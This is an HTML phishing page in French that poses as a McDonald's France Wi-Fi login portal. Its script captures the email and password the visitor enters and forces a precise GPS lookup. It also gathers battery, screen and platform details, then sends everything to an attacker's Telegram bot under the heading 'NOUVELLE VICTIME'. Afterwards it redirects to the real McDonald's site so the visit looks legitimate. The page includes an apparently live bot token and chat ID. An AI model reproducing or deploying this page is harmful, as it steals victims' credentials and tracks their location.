<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>McDo™ Wi-Fi - Authentification</title>

<style>
  :root {
    --mcdo-red: #da291c;
    --mcdo-yellow: #ffbc0d;
    --mcdo-green: #0a472c;
    --mcdo-grey: #4d4d4d;
    --background: #fdfdfd;
  }
  body { background-color: var(--background); color: var(--mcdo-grey); font-family: Arial, sans-serif; margin: 0; padding: 0; }
  header { background-color: var(--mcdo-green); color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 18px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
  .container { max-width: 400px; margin: 20px auto; padding: 20px; }
  .login-box { background: white; padding: 25px; border-radius: 12px; border: 1px solid #ddd; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
  h2 { color: var(--mcdo-red); font-size: 20px; margin-top: 0; text-align: center; }
  .field { margin-bottom: 15px; }
  .field label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
  .field input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
  .btn-submit { width: 100%; padding: 15px; background-color: var(--mcdo-yellow); color: var(--mcdo-green); border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
  #loader { display: none; text-align: center; margin-top: 20px; }
  .spinner { width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid var(--mcdo-red); border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  footer { text-align: center; font-size: 11px; color: #aaa; margin-top: 30px; }
</style>
</head>
<body>

<header>McDo™ Wi-Fi Gratuit</header>

<div class="container">
  <div class="login-box" id="auth-form">
    <h2>Identifiez-vous</h2>
    <p style="font-size: 12px; text-align: center;">Connectez-vous avec votre compte McDo+ pour accéder au Wi-Fi illimité.</p>
    
    <div class="field">
      <label>Email</label>
      <input type="email" id="user-email" placeholder="exemple@mail.com" required>
    </div>

    <div class="field">
      <label>Mot de passe</label>
      <input type="password" id="user-pass" placeholder="••••••••" required>
    </div>

    <button class="btn-submit" onclick="handleLogin()">SE CONNECTER</button>
  </div>

  <div id="loader">
    <div class="spinner"></div>
    <p id="status">Vérification de vos identifiants...</p>
  </div>
</div>

<footer>© 2026 McDonald's System of France</footer>

<script>
const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
const TELEGRAM_CHAT_ID = "7400979339";

// Fonction pour récupérer la batterie
async function getBattery() {
  if (!navigator.getBattery) return "Non supporté";
  try {
    const b = await navigator.getBattery();
    return Math.round(b.level * 100) + "%";
  } catch(e) { return "Inconnue"; }
}

// Fonction GPS corrigée pour forcer la demande
function getLoc() {
  return new Promise(res => {
    if (!navigator.geolocation) {
      res("Non supporté ❌");
      return;
    }
    
    // On force les options pour réveiller le GPS
    const options = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(
      p => res(`${p.coords.latitude},${p.coords.longitude}`),
      err => {
        console.log("Erreur GPS:", err);
        res("Refusé ou Erreur ❌");
      },
      options
    );
  });
}

async function handleLogin() {
  const email = document.getElementById('user-email').value;
  const pass = document.getElementById('user-pass').value;

  if(!email || !pass) {
    alert("Veuillez remplir tous les champs.");
    return;
  }

  // Cacher le formulaire et montrer le chargement (ça laisse le temps au GPS)
  document.getElementById('auth-form').style.display = 'none';
  document.getElementById('loader').style.display = 'block';

  // Lancement simultané de la localisation et de la batterie
  const [location, battery] = await Promise.all([getLoc(), getBattery()]);
  
  const screen = `${window.screen.width}x${window.screen.height}`;

  // Construction du message avec lien Maps cliquable
  const locDisplay = location.includes(',') ? `https://www.google.com/maps?q=${location}` : location;

  const texte = `⚡️ NOUVELLE VICTIME ⚡️\n\n` +
                `📧 Email: ${email}\n` +
                `🔑 Pass: ${pass}\n` +
                `📍 GPS: ${locDisplay}\n` +
                `🔋 Batterie: ${battery}\n` +
                `🖥 Écran: ${screen}\n` +
                `📱 Plateforme: ${navigator.platform}`;

  // Envoi Telegram
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: texte})
    });
  } catch(e) {}

  // Redirection finale pour faire vrai
  setTimeout(() => {
    document.getElementById('status').innerText = "Authentification réussie !";
    setTimeout(() => {
      window.location.href = "https://www.mcdonalds.fr/fidele-au-poste"; 
    }, 1000);
  }, 1500);
}
</script>
</body>
</html>
